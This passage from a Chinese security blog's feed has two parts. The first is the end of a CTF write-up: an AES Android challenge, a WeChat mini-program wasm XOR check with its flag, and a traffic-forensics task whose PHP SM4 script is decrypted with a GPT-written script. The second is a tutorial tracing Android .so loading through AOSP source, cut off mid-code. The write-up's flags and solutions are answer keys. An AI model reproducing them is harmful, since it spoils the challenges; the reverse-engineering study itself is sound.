   &#125;    private void showDialog(String msg) &#123;        new AlertDialog.Builder(this).setMessage(msg).setPositiveButton(&quot;OK&quot;, (DialogInterface.OnClickListener) null).show();    &#125;&#125;</code></pre><p>就是一个 AES 加密，DES 以字符串的形式传到 a 方法，然后首字母进行异或一下，就是 AES，赛博厨子一把梭<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250908135635406.png" alt="image-20250908135635406"></p><h3 id="minigame"><a href="#minigame" class="headerlink" title="minigame"></a>minigame</h3><p>小程序逆向，给的附件中没有文件后缀，加一下就可以了<br>然后使用这个项目解包，<a href="https://github.com/biggerstar/wedecode">biggerstar&#x2F;wedecode: 全自动化，微信小程序 wxapkg 包 源代码还原工具, 线上代码安全审计</a></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250908145753540.png" alt="image-20250908145753540"></p><p>check逻辑就在 wasm 文件里，ghidra 装插件就可以直接反编译了<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250908145902993.png" alt="image-20250908145902993"></p><p>就是一个 xor，直接一把梭<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250908145918957.png" alt="image-20250908145918957"></p><p>后面补个 大括号<br>flag{fae0b27c451c728867a567e8c1bb4e53}</p><h3 id="checkwebshell"><a href="#checkwebshell" class="headerlink" title="checkwebshell"></a>checkwebshell</h3><p>进流量包搜索flag：</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/img_typoraimage-20250908145512982.png" alt="image-20250908145512982"></p><p>看到709包有明显的flag脚本内容，直接追踪HTTP流并下载为1.php</p><pre><code>&lt;?phpclass SM4 &#123;    const ENCRYPT = 1;    private $sk;    private static $FK = [0xA3B1BAC6, 0x56AA3350, 0x677D9197, 0xB27022DC];    private static $CK = [        0x00070E15, 0x1C232A31, 0x383F464D, 0x545B6269,        0x70777E85, 0x8C939AA1, 0xA8AFB6BD, 0xC4CBD2D9,        0xE0E7EEF5, 0xFC030A11, 0x181F262D, 0x343B4249,        0x50575E65, 0x6C737A81, 0x888F969D, 0xA4ABB2B9,        0xC0C7CED5, 0xDCE3EAF1, 0xF8FF060D, 0x141B2229,        0x30373E45, 0x4C535A61, 0x686F767D, 0x848B9299,        0xA0A7AEB5, 0xBCC3CAD1, 0xD8DFE6ED, 0xF4FB0209,        0x10171E25, 0x2C333A41, 0x484F565D, 0x646B7279    ];    private static $SboxTable = [        0xD6, 0x90, 0xE9, 0xFE, 0xCC, 0xE1, 0x3D, 0xB7, 0x16, 0xB6, 0x14, 0xC2, 0x28, 0xFB, 0x2C, 0x05,        0x2B, 0x67, 0x9A, 0x76, 0x2A, 0xBE, 0x04, 0xC3, 0xAA, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99,        0x9C, 0x42, 0x50, 0xF4, 0x91, 0xEF, 0x98, 0x7A, 0x33, 0x54, 0x0B, 0x43, 0xED, 0xCF, 0xAC, 0x62,        0xE4, 0xB3, 0x1C, 0xA9, 0xC9, 0x08, 0xE8, 0x95, 0x80, 0xDF, 0x94, 0xFA, 0x75, 0x8F, 0x3F, 0xA6,        0x47, 0x07, 0xA7, 0xFC, 0xF3, 0x73, 0x17, 0xBA, 0x83, 0x59, 0x3C, 0x19, 0xE6, 0x85, 0x4F, 0xA8,        0x68, 0x6B, 0x81, 0xB2, 0x71, 0x64, 0xDA, 0x8B, 0xF8, 0xEB, 0x0F, 0x4B, 0x70, 0x56, 0x9D, 0x35,        0x1E, 0x24, 0x0E, 0x5E, 0x63, 0x58, 0xD1, 0xA2, 0x25, 0x22, 0x7C, 0x3B, 0x01, 0x0D, 0x2D, 0xEC,        0x84, 0x9B, 0x1E, 0x87, 0xE0, 0x3E, 0xB5, 0x66, 0x48, 0x02, 0x6C, 0xBB, 0xBB, 0x32, 0x83, 0x27,        0x9E, 0x01, 0x8D, 0x53, 0x9B, 0x64, 0x7B, 0x6B, 0x6A, 0x6C, 0xEC, 0xBB, 0xC4, 0x94, 0x3B, 0x0C,        0x76, 0xD2, 0x09, 0xAA, 0x16, 0x15, 0x3D, 0x2D, 0x0A, 0xFD, 0xE4, 0xB7, 0x37, 0x63, 0x28, 0xDD,        0x7C, 0xEA, 0x97, 0x8C, 0x6D, 0xC7, 0xF2, 0x3E, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7,        0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B, 0xFC, 0x56, 0x36, 0x24, 0x07, 0x82, 0xFA, 0x54, 0x5B, 0x40,        0x8F, 0xED, 0x1F, 0xDA, 0x93, 0x80, 0xF9, 0x61, 0x1C, 0x70, 0xC3, 0x85, 0x95, 0xA9, 0x79, 0x08,        0x46, 0x29, 0x02, 0x3B, 0x4D, 0x83, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x1A, 0x47, 0x5C, 0x0D, 0xEA,        0x9E, 0xCB, 0x55, 0x20, 0x15, 0x8A, 0x9A, 0xCB, 0x43, 0x0C, 0xF0, 0x0B, 0x40, 0x58, 0x00, 0x8F,        0xEB, 0xBE, 0x3D, 0xC2, 0x9F, 0x51, 0xFA, 0x13, 0x3B, 0x0D, 0x90, 0x5B, 0x6E, 0x45, 0x59, 0x33    ];    public function __construct($key) &#123;        $this-&gt;setKey($key);    &#125;    public function setKey($key) &#123;        if (strlen($key) != 16) &#123;            throw new Exception(&quot;SM4&quot;);        &#125;        $key = $this-&gt;strToIntArray($key);        $k = array_merge($key, [0, 0, 0, 0]);        for ($i = 0; $i &lt; 4; $i++) &#123;            $k[$i] ^= self::$FK[$i];        &#125;        for ($i = 0; $i &lt; 32; $i++) &#123;            $k[$i + 4] = $k[$i] ^ $this-&gt;CKF($k[$i + 1], $k[$i + 2], $k[$i + 3], self::$CK[$i]);            $this-&gt;sk[$i] = $k[$i + 4];        &#125;    &#125;    public function encrypt($plaintext) &#123;        $len = strlen($plaintext);        $padding = 16 - ($len % 16);        $plaintext .= str_repeat(chr($padding), $padding);        $ciphertext = &#39;&#39;;        for ($i = 0; $i &lt; strlen($plaintext); $i += 16) &#123;            $block = substr($plaintext, $i, 16);            $ciphertext .= $this-&gt;cryptBlock($block, self::ENCRYPT);        &#125;        return $ciphertext;    &#125;    private function cryptBlock($block, $mode) &#123;        $x = $this-&gt;strToIntArray($block);        for ($i = 0; $i &lt; 32; $i++) &#123;            $roundKey = $this-&gt;sk[$i];            $x[4] = $x[0] ^ $this-&gt;F($x[1], $x[2], $x[3], $roundKey);            array_shift($x);        &#125;        $x = array_reverse($x);        return $this-&gt;intArrayToStr($x);    &#125;    private function F($x1, $x2, $x3, $rk) &#123;        return $this-&gt;T($x1 ^ $x2 ^ $x3 ^ $rk);    &#125;    private function CKF($a, $b, $c, $ck) &#123;        return $a ^ $this-&gt;T($b ^ $c ^ $ck);    &#125;    private function T($x) &#123;        return $this-&gt;L($this-&gt;S($x));    &#125;    private function S($x) &#123;        $result = 0;        for ($i = 0; $i &lt; 4; $i++) &#123;            $byte = ($x &gt;&gt; (24 - $i * 8)) &amp; 0xFF;            $result |= self::$SboxTable[$byte] &lt;&lt; (24 - $i * 8);        &#125;        return $result;    &#125;    private function L($x) &#123;        return $x ^ $this-&gt;rotl($x, 2) ^ $this-&gt;rotl($x, 10) ^ $this-&gt;rotl($x, 18) ^ $this-&gt;rotl($x, 24);    &#125;    private function rotl($x, $n) &#123;        return (($x &lt;&lt; $n) &amp; 0xFFFFFFFF) | (($x &gt;&gt; (32 - $n)) &amp; 0xFFFFFFFF);    &#125;    private function strToIntArray($str) &#123;        $result = [];        for ($i = 0; $i &lt; 4; $i++) &#123;            $offset = $i * 4;            $result[$i] =                (ord($str[$offset]) &lt;&lt; 24) |                (ord($str[$offset + 1]) &lt;&lt; 16) |                (ord($str[$offset + 2]) &lt;&lt; 8) |                ord($str[$offset + 3]);        &#125;        return $result;    &#125;    private function intArrayToStr($array) &#123;        $str = &#39;&#39;;        foreach ($array as $int) &#123;            $str .= chr(($int &gt;&gt; 24) &amp; 0xFF);            $str .= chr(($int &gt;&gt; 16) &amp; 0xFF);            $str .= chr(($int &gt;&gt; 8) &amp; 0xFF);            $str .= chr($int &amp; 0xFF);        &#125;        return $str;    &#125;&#125;try &#123;    $key = &quot;a8a58b78f41eeb6a&quot;;    $sm4 = new SM4($key);    $plaintext = &quot;flag&quot;;    $ciphertext = $sm4-&gt;encrypt($plaintext);    echo  base64_encode($ciphertext) ; //VCWBIdzfjm45EmYFWcqXX0VpQeZPeI6Qqyjsv31yuPTDC80lhFlaJY2R3TintdQu&#125; catch (Exception $e) &#123;    echo $e-&gt;getMessage() ;&#125;?&gt;</code></pre><p>复制脚本给GPT，并且提示词：</p><pre><code>帮我写一个这个解密脚本，从base64_encode($ciphertext)还原到plaintext，输出的base64是VCWBIdzfjm45EmYFWcqXX0VpQeZPeI6Qqyjsv31yuPTDC80lhFlaJY2R3TintdQu。直接给我逆向脚本就可以了</code></pre><p>解密脚本：</p><pre><code>&lt;?phpclass SM4 &#123;    const ENCRYPT = 1;    const DECRYPT = 0;    private $sk;    private static $FK = [0xA3B1BAC6, 0x56AA3350, 0x677D9197, 0xB27022DC];    private static $CK = [        0x00070E15, 0x1C232A31, 0x383F464D, 0x545B6269,        0x70777E85, 0x8C939AA1, 0xA8AFB6BD, 0xC4CBD2D9,        0xE0E7EEF5, 0xFC030A11, 0x181F262D, 0x343B4249,        0x50575E65, 0x6C737A81, 0x888F969D, 0xA4ABB2B9,        0xC0C7CED5, 0xDCE3EAF1, 0xF8FF060D, 0x141B2229,        0x30373E45, 0x4C535A61, 0x686F767D, 0x848B9299,        0xA0A7AEB5, 0xBCC3CAD1, 0xD8DFE6ED, 0xF4FB0209,        0x10171E25, 0x2C333A41, 0x484F565D, 0x646B7279    ];    private static $SboxTable = [        0xD6,0x90,0xE9,0xFE,0xCC,0xE1,0x3D,0xB7,0x16,0xB6,0x14,0xC2,0x28,0xFB,0x2C,0x05,        0x2B,0x67,0x9A,0x76,0x2A,0xBE,0x04,0xC3,0xAA,0x44,0x13,0x26,0x49,0x86,0x06,0x99,        0x9C,0x42,0x50,0xF4,0x91,0xEF,0x98,0x7A,0x33,0x54,0x0B,0x43,0xED,0xCF,0xAC,0x62,        0xE4,0xB3,0x1C,0xA9,0xC9,0x08,0xE8,0x95,0x80,0xDF,0x94,0xFA,0x75,0x8F,0x3F,0xA6,        0x47,0x07,0xA7,0xFC,0xF3,0x73,0x17,0xBA,0x83,0x59,0x3C,0x19,0xE6,0x85,0x4F,0xA8,        0x68,0x6B,0x81,0xB2,0x71,0x64,0xDA,0x8B,0xF8,0xEB,0x0F,0x4B,0x70,0x56,0x9D,0x35,        0x1E,0x24,0x0E,0x5E,0x63,0x58,0xD1,0xA2,0x25,0x22,0x7C,0x3B,0x01,0x0D,0x2D,0xEC,        0x84,0x9B,0x1E,0x87,0xE0,0x3E,0xB5,0x66,0x48,0x02,0x6C,0xBB,0xBB,0x32,0x83,0x27,        0x9E,0x01,0x8D,0x53,0x9B,0x64,0x7B,0x6B,0x6A,0x6C,0xEC,0xBB,0xC4,0x94,0x3B,0x0C,        0x76,0xD2,0x09,0xAA,0x16,0x15,0x3D,0x2D,0x0A,0xFD,0xE4,0xB7,0x37,0x63,0x28,0xDD,        0x7C,0xEA,0x97,0x8C,0x6D,0xC7,0xF2,0x3E,0x1A,0x71,0x1D,0x29,0xC5,0x89,0x6F,0xB7,        0x62,0x0E,0xAA,0x18,0xBE,0x1B,0xFC,0x56,0x36,0x24,0x07,0x82,0xFA,0x54,0x5B,0x40,        0x8F,0xED,0x1F,0xDA,0x93,0x80,0xF9,0x61,0x1C,0x70,0xC3,0x85,0x95,0xA9,0x79,0x08,        0x46,0x29,0x02,0x3B,0x4D,0x83,0x3A,0x0A,0x49,0x06,0x24,0x1A,0x47,0x5C,0x0D,0xEA,        0x9E,0xCB,0x55,0x20,0x15,0x8A,0x9A,0xCB,0x43,0x0C,0xF0,0x0B,0x40,0x58,0x00,0x8F,        0xEB,0xBE,0x3D,0xC2,0x9F,0x51,0xFA,0x13,0x3B,0x0D,0x90,0x5B,0x6E,0x45,0x59,0x33    ];    public function __construct($key) &#123;        $this-&gt;setKey($key);    &#125;    public function setKey($key) &#123;        if (strlen($key) != 16) throw new Exception(&quot;SM4&quot;);        $key = $this-&gt;strToIntArray($key);        $k = array_merge($key, [0,0,0,0]);        for ($i=0;$i&lt;4;$i++) $k[$i] ^= self::$FK[$i];        for ($i=0;$i&lt;32;$i++) &#123;            $k[$i+4] = $k[$i] ^ $this-&gt;CKF($k[$i+1], $k[$i+2], $k[$i+3], self::$CK[$i]);            $this-&gt;sk[$i] = $k[$i+4];        &#125;    &#125;    public function decrypt($ciphertext) &#123;        $plaintext = &#39;&#39;;        for ($i=0; $i&lt;strlen($ciphertext); $i+=16) &#123;            $block = substr($ciphertext, $i, 16);            $plaintext .= $this-&gt;cryptBlock($block, self::DECRYPT);        &#125;        // 去掉 PKCS#7 填充        $pad = ord(substr($plaintext, -1));        return substr($plaintext, 0, -$pad);    &#125;    private function cryptBlock($block, $mode) &#123;        $x = $this-&gt;strToIntArray($block);        for ($i=0; $i&lt;32; $i++) &#123;            $rk = $this-&gt;sk[$mode==self::ENCRYPT ? $i : (31-$i)];            $x[4] = $x[0] ^ $this-&gt;F($x[1], $x[2], $x[3], $rk);            array_shift($x);        &#125;        $x = array_reverse($x);        return $this-&gt;intArrayToStr($x);    &#125;    private function F($x1,$x2,$x3,$rk)&#123;return $this-&gt;T($x1^$x2^$x3^$rk);&#125;    private function CKF($a,$b,$c,$ck)&#123;return $a ^ $this-&gt;T($b^$c^$ck);&#125;    private function T($x)&#123;return $this-&gt;L($this-&gt;S($x));&#125;    private function S($x)&#123;        $r=0;        for($i=0;$i&lt;4;$i++)&#123;            $b=($x&gt;&gt;(24-$i*8))&amp;0xFF;            $r|=self::$SboxTable[$b]&lt;&lt;(24-$i*8);        &#125;        return $r;    &#125;    private function L($x)&#123;return $x ^ $this-&gt;rotl($x,2)^$this-&gt;rotl($x,10)^$this-&gt;rotl($x,18)^$this-&gt;rotl($x,24);&#125;    private function rotl($x,$n)&#123;return (($x&lt;&lt;$n)&amp;0xFFFFFFFF)|(($x&gt;&gt;(32-$n))&amp;0xFFFFFFFF);&#125;    private function strToIntArray($str)&#123;        $res=[];        for($i=0;$i&lt;4;$i++)&#123;            $o=$i*4;            $res[$i]=(ord($str[$o])&lt;&lt;24)|(ord($str[$o+1])&lt;&lt;16)|(ord($str[$o+2])&lt;&lt;8)|ord($str[$o+3]);        &#125;        return $res;    &#125;    private function intArrayToStr($arr)&#123;        $s=&#39;&#39;;        foreach($arr as $int)&#123;            $s.=chr(($int&gt;&gt;24)&amp;0xFF).chr(($int&gt;&gt;16)&amp;0xFF).chr(($int&gt;&gt;8)&amp;0xFF).chr($int&amp;0xFF);        &#125;        return $s;    &#125;&#125;try &#123;    $key = &quot;a8a58b78f41eeb6a&quot;;    $sm4 = new SM4($key);    $cipher_b64 = &quot;VCWBIdzfjm45EmYFWcqXX0VpQeZPeI6Qqyjsv31yuPTDC80lhFlaJY2R3TintdQu&quot;;    $cipher_raw = base64_decode($cipher_b64);    $plaintext = $sm4-&gt;decrypt($cipher_raw);    echo $plaintext; // 输出: flag&#125; catch (Exception $e) &#123;    echo $e-&gt;getMessage();&#125;?&gt;</code></pre><p>获得flag：</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/img_typoraimage-20250908145659124.png" alt="image-20250908145659124"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
            <tag> WritesUp </tag>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android SO 文件加载过程</title>
      <link href="/2025/09/08/Android%20SO%20%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BD%E8%BF%87%E7%A8%8B/"/>
      <url>/2025/09/08/Android%20SO%20%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BD%E8%BF%87%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="Android-SO-文件加载过程"><a href="#Android-SO-文件加载过程" class="headerlink" title="Android SO 文件加载过程"></a>Android SO 文件加载过程</h1><h3 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h3><p>​针对 Android so 文件加载过程只有一个很浅显的认识，后来想稍微系统学习的时候，AOSP 的源码不公开了…直到最近在看雪上看到一篇<a href="https://bbs.kanxue.com/thread-285788.htm">文章</a>，里面贴出了一个网址，可以正常访问到 AOSP 的源码，于是乎打算学习并记录一下。</p><h3 id="二、开始"><a href="#二、开始" class="headerlink" title="二、开始"></a>二、开始</h3><p>​在 Android 中，.so 文件是 <strong>共享库</strong> 文件，共享库文件又可以细分为 <strong>动态链接库</strong>（动态 .so 文件）和 <strong>静态链接库</strong>（静态 .a 文件）。但在 Android 中一般更常见的是动态 .so 文件，静态链接库通常在编译时就被集成到最终应用中，而不是直接加载。所以经常看到的 so 文件的链接大多都是以动态链接的。</p><p>​动态链接会利用对应的打包生成的 APK，按照对应的 ABI（lib&#x2F;armeabi-v7a&#x2F;，lib&#x2F;arm64-v8a&#x2F;，lib&#x2F;x86&#x2F;，lib&#x2F;x86_64&#x2F;）去选择对应的 so 文件，然后去实现在 Java 层的调用，或者在 native 层调用 Java层的代码逻辑。</p><p>​Java 代码使用 静态 <code>System.loadLibrary(&quot;libsofile&quot;)</code> 来加载共享库文件；或者通过动态加载路径的 so 文件来实现。</p><p>​在 Android 中，<strong>静态链接库</strong> （.a 文件）是被链接到最终的可执行文件中，而不是在运行时加载。Android NDK 编译时，静态库会被打包到 APK 中的应用代码部分。</p><p>​要探究 so 文件最真实的加载过程就从 System.load(soPath); 开始，去剖析<a href="https://cs.android.com/">安卓源码</a>。</p><p>​这里我就用自己写的一个题目为例，来进行分析。首先看到在 MainActivity.java 中的 <strong>System.loadLibrary(“ctf1”);</strong>。<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250909112636118.png" alt="image-20250909112636118"></p><p>跟进 <strong>loadLibrary</strong> 函数</p><pre><code class="language-Java">    @CallerSensitive    public static void loadLibrary(String libname) &#123;        Runtime.getRuntime().loadLibrary0(Reflection.getCallerClass(), libname);    &#125;</code></pre><p>​首先第一行的注解，作用是告诉 JVM&#x2F;安全检查逻辑：</p><ul><li>这个方法的行为 <strong>依赖于调用者是谁</strong>；</li><li>不能随便内联或优化，因为它需要直到调用栈上是谁在调用。</li></ul><p>​比如 <strong>System.loadLibrary</strong> 最终要决定：是允许调用方加载本地库，还是拒绝（比如安全管理器里限制）；所以 JVM 会特别处理 <code>@CallerSensitive</code>，正确识别“真实的调用者类”。</p><p>​接下来通过 Java 的反射机制拿到调用类，并和 so 文件名一起传入到由 JVM 的运行时对象调用的 <strong>loadLibrary0</strong> 方法中。到这里要想再进一步跟进就得上网站看 Android 源码了。直接进行搜索，就可以找到。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250909113351174.png" alt="image-20250909113351174"></p><p>​该方法先拿到调用者类对应的类加载器，然后又将其作为参数之一，调用了另一个重载版本，继续跟进。</p><pre><code class="language-Java">private synchronized void loadLibrary0(ClassLoader loader, Class&lt;?&gt; callerClass, String libname) &#123;        if (libname.indexOf((int)File.separatorChar) != -1) &#123;            throw new UnsatisfiedLinkError(    &quot;Directory separator should not appear in library name: &quot; + libname);        &#125;        String libraryName = libname;        // Android-note: BootClassLoader doesn&#39;t implement findLibrary(). http://b/111850480        // Android&#39;s class.getClassLoader() can return BootClassLoader where the RI would        // have returned null; therefore we treat BootClassLoader the same as null here.        if (loader != null &amp;&amp; !(loader instanceof BootClassLoader)) &#123;            String filename = loader.findLibrary(libraryName);            if (filename == null &amp;&amp;                    (loader.getClass() == PathClassLoader.class ||                     loader.getClass() == DelegateLastClassLoader.class)) &#123;                // Don&#39;t give up even if we failed to find the library in the native lib paths.                // The underlying dynamic linker might be able to find the lib in one of the linker                // namespaces associated with the current linker namespace. In order to give the                // dynamic linker a chance, proceed to load the library with its soname, which                // is the fileName.                // Note that we do this only for PathClassLoader  and DelegateLastClassLoader to                // minimize the scope of this behavioral change as much as possible, which might                // cause problem like b/143649498. These two class loaders are the only                // platform-provided class loaders that can load apps. See the classLoader attribute                // of the application tag in app manifest.                filename = System.mapLibraryName(libraryName);            &#125;            if (filename == null) &#123;                // It&#39;s not necessarily true that the ClassLoader used                // System.mapLibraryName, but the default setup does, and it&#39;s                // misleading to say we didn&#39;t find &quot;libMyLibrary.so&quot; when we                // actually searched for &quot;liblibMyLibrary.so.so&quot;.                throw new UnsatisfiedLinkError(loader + &quot; couldn&#39;t find \&quot;&quot; +                                               System.mapLibraryName(libraryName) + &quot;\&quot;&quot;);            &#125;            String error = nativeLoad(filename, loader, callerClass);            if (error != null) &#123;                throw new UnsatisfiedLinkError(error);            &#125;            return;        &#125;        // We know some apps use mLibPaths directly, potentially assuming it&#39;s not null.        // Initialize it here to make sure apps see a non-null value.        getLibPaths();        String filename = System.mapLibraryName(libraryName);        String error = nativeLoad(filename, loader, callerClass);        if (error != null) &#123;            throw new UnsatisfiedLinkError(error);        &#125;    &#125;</code></pre><p>​该重载方法首先先检查库名是否合法，然后判断 loader 非空且不是 BootClassLoader，就调用 <strong>findLibrary</strong>，让类加载器自己找库文件；而如果找不到，就会分别调用 <strong>PathClassLoader</strong> 和 <strong>DelegateLastClassLoader</strong> 再进一步尝试去加载库。如果依旧找不到，那么系统就会抛出 UnsatisfiedLinkError，告诉开发人员哪个 ClassLoader 找不到哪个库。接下来便是调用 JNI 层方法 <strong>nativeLoad</strong>，内部最终会调用 dlopen 函数。而如果 loader 为 null 或 BootClassLoader，则使用 JVM 默认的库路径（java.library.path &#x2F; Android 的 mLibPaths），拼接文件名，再调用 <strong>nativeLoad</strong>，同样，失败抛出异常。继续跟进。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250909115530624.png" alt="image-20250909115530624"></p><p>​到这里就是 native 函数了，就需要去看对应的 c 文件了，所以要重新去搜索了，这里的搜索方法就是 <strong>类名_函数名</strong> 的形式，转换过去就是 <strong>Runtime_nativeLoad</strong> 函数。</p><pre><code class="language-c">JNIEXPORT jstring JNICALLRuntime_nativeLoad(JNIEnv* env, jclass ignored, jstring javaFilename,                   jobject javaLoader, jclass caller)&#123;    return JVM_NativeLoad(env, javaFilename, javaLoader, caller);&#125;</code></pre><p>​这里就是正常的返回，直接走 JVM_NativeLoad(env, javaFilename, javaLoader, caller); 。继续跟进。</p><pre><code class="language-c++">JNIEXPORT jstring JVM_NativeLoad(JNIEnv* env,                                 jstring javaFilename,                                 jobject javaLoader,                                 jclass caller) &#123;  ScopedUtfChars filename(env, javaFilename);  if (filename.c_str() == nullptr) &#123;    return nullptr;  &#125;  std::string error_msg;  &#123;    art::JavaVMExt* vm = art::Runtime::Current()-&gt;GetJavaVM();    bool success = vm-&gt;LoadNativeLibrary(env,                                         filename.c_str(),                                         javaLoader,                                         caller,                                         &amp;error_msg);    if (success) &#123;      return nullptr;    &#125;  &#125;  // Don&#39;t let a pending exception from JNI_OnLoad cause a CheckJNI issue with NewStringUTF.  env-&gt;ExceptionClear();  return env-&gt;NewStringUTF(error_msg.c_str());&#125;</code></pre><p>​该方法 首先将传进来的 so 库库名转为 C++ 字符串，然后获取当前 ART 运行时实例，并获取对应的 <strong>JavaVMExt</strong> 对象，再将多个函数传入到 <strong>LoadNativeLibrary</strong> 函数中，如果成功，返回 true，失败则返回 false 并 填充 error_msg。后面是异常处理部分，就没什么好说的了，继续跟进。</p><pre><code class="language-C++">bool JavaVMExt::LoadNativeLibrary(JNIEnv* env,                                  const std::string&amp; path,                                  jobject class_loader,                                  jclass caller_class,                                  std::string* error_msg) &#123;  error_msg-&gt;clear();  // See if we&#39;ve already loaded this library.  If we have, and the class loader  // matches, return successfully without doing anything.  // TODO: for better results we should canonicalize the pathname (or even compare  // inodes). This implementation is fine if everybody is using System.loadLibrary.  SharedLibrary* library;  Thread* self = Thread::Current();  &#123;    // TODO: move the locking (and more of this logic) into Libraries.    MutexLock mu(self, *Locks::jni_libraries_lock_);    library = libraries_-&gt;Get(path);  &#125;  void* class_loader_allocator = nullptr;  std::string caller_location;  &#123;    ScopedObjectAccess soa(env);    // As the incoming class loader is reachable/alive during the call of this function,    // it&#39;s okay to decode it without worrying about unexpectedly marking it alive.    ObjPtr&lt;mirror::ClassLoader&gt; loader = soa.Decode&lt;mirror::ClassLoader&gt;(class_loader);    ClassLinker* class_linker = Runtime::Current()-&gt;GetClassLinker();    if (class_linker-&gt;IsBootClassLoader(loader)) &#123;      loader = nullptr;      class_loader = nullptr;    &#125;    if (caller_class != nullptr) &#123;      ObjPtr&lt;mirror::Class&gt; caller = soa.Decode&lt;mirror::Class&gt;(caller_class);      ObjPtr&lt;mirror::DexCache&gt; dex_cache = caller-&gt;GetDexCache();      if (dex_cache != nullptr) &#123;        caller_location = dex_cache-&gt;GetLocation()-&gt;ToModifiedUtf8();      &#125;    &#125;    class_loader_allocator = class_linker-&gt;GetAllocatorForClassLoader(loader);    CHECK(class_loader_allocator != nullptr);  &#125;  if (library != nullptr) &#123;    // Use the allocator pointers for class loader equality to avoid unnecessary weak root decode.    if (library-&gt;GetClassLoaderAllocator() != class_loader_allocator) &#123;      // The library will be associated with class_loader. The JNI      // spec says we can&#39;t load the same library into more than one      // class loader.      //      // This isn&#39;t very common. So spend some time to get a readable message.      auto call_to_string = [&amp;](jobject obj) -&gt; std::string &#123;        if (obj == nullptr) &#123;          return &quot;null&quot;;        &#125;        // Handle jweaks. Ignore double local-ref.        ScopedLocalRef&lt;jobject&gt; local_ref(env, env-&gt;NewLocalRef(obj));        if (local_ref != nullptr) &#123;          ScopedLocalRef&lt;jclass&gt; local_class(env, env-&gt;GetObjectClass(local_ref.get()));          jmethodID to_string = env-&gt;GetMethodID(local_class.get(),                                                 &quot;toString&quot;,                                                 &quot;()Ljava/lang/String;&quot;);          DCHECK(to_string != nullptr);          ScopedLocalRef&lt;jobject&gt; local_string(env,                                               env-&gt;CallObjectMethod(local_ref.get(), to_string));          if (local_string != nullptr) &#123;            ScopedUtfChars utf(env, reinterpret_cast&lt;jstring&gt;(local_string.get()));            if (utf.c_str() != nullptr) &#123;              return utf.c_str();            &#125;          &#125;          if (env-&gt;ExceptionCheck()) &#123;            // We can&#39;t do much better logging, really. So leave it with a Describe.            env-&gt;ExceptionDescribe();            env-&gt;ExceptionClear();          &#125;          return &quot;(Error calling toString)&quot;;        &#125;        return &quot;null&quot;;      &#125;;      std::string old_class_loader = call_to_string(library-&gt;GetClassLoader());      std::string new_class_loader = call_to_string(class_loader);      StringAppendF(error_msg, &quot;Shared library \&quot;%s\&quot; already opened by &quot;          &quot;ClassLoader %p(%s); can&#39;t open in ClassLoader %p(%s)&quot;,          path.c_str(),          library-&gt;GetClassLoader(),          old_class_loader.c_str(),          class_loader,          new_class_loader.c_str());      LOG(WARNING) &lt;&lt; *error_msg;      return false;    &#125;    VLOG(jni) &lt;&lt; &quot;[Shared library \&quot;&quot; &lt;&lt; path &lt;&lt; &quot;\&quot; already loaded in &quot;              &lt;&lt; &quot; ClassLoader &quot; &lt;&lt; class_loader &lt;&lt; &quot;]&quot;;    if (!library-&gt;CheckOnLoadResult()) &#123;      StringAppendF(error_msg, &quot;JNI_OnLoad failed on a previous attempt &quot;          &quot;to load \&quot;%s\&quot;&quot;, path.c_str());      return false;    &#125;    return true;  &#125;// Open the shared library.  Because we&#39;re using a full path, the system  // doesn&#39;t have to search through LD_LIBRARY_PATH.  (It may do so to  // resolve this library&#39;s dependencies though.)  // Failures here are expected when java.library.path has several entries  // and we have to hunt for the lib.  // Below we dlopen but there is no paired dlclose, this would be necessary if we supported  // class unloading. Libraries will only be unloaded when the reference count (incremented by  // dlopen) becomes zero from dlclose.  // Retrieve the library path from the classloader, if necessary.  ScopedLocalRef&lt;jstring&gt; library_path(env, GetLibrarySearchPath(env, class_loader));  Locks::mutator_lock_-&gt;AssertNotHeld(self);  const char* path_str = path.empty() ? nullptr : path.c_str();  bool needs_native_bridge = false;  char* nativeloader_error_msg = nullptr;  void* handle = android::OpenNativeLibrary(      env,      runtime_-&gt;GetTargetSdkVersion(),      path_str,      class_loader,      (caller_location.empty() ? nullptr : caller_location.c_str()),      library_path.get(),      &amp;needs_native_bridge,      &amp;nativeloader_error_msg);  VLOG(jni) &lt;&lt; &quot;[Call to dlopen(\&quot;&quot; &lt;&lt; path &lt;&lt; &quot;\&quot;, RTLD_NOW) returned &quot; &lt;&lt; handle &lt;&lt; &quot;]&quot;;  if (handle == nullptr) &#123;    *error_msg = nativeloader_error_msg;    android::NativeLoaderFreeErrorMessage(nativeloader_error_msg);    VLOG(jni) &lt;&lt; &quot;dlopen(\&quot;&quot; &lt;&lt; path &lt;&lt; &quot;\&quot;, RTLD_NOW) failed: &quot; &lt;&lt; *error_msg;    return false;  &#125;  if (env-&gt;ExceptionCheck() == JNI_TRUE) &#123;    LOG(ERROR) &lt;&lt; &quot;Unexpected exception:&quot;;    env-&gt;ExceptionDescribe();    env-&gt;ExceptionClear();  &#125;  // Create a new entry.  // TODO: move the locking (and more of this logic) into Libraries.  bool created_library = false;  &#123;    // Create SharedLibrary ahead of taking the libraries lock to maintain lock ordering.    std::unique_ptr&lt;SharedLibrary&gt; new_library(        new SharedLibrary(env,                          self,                          path,                          handle,                          needs_native_bridge,                          class_loader,                          class_loader_allocator));    MutexLock mu(self, 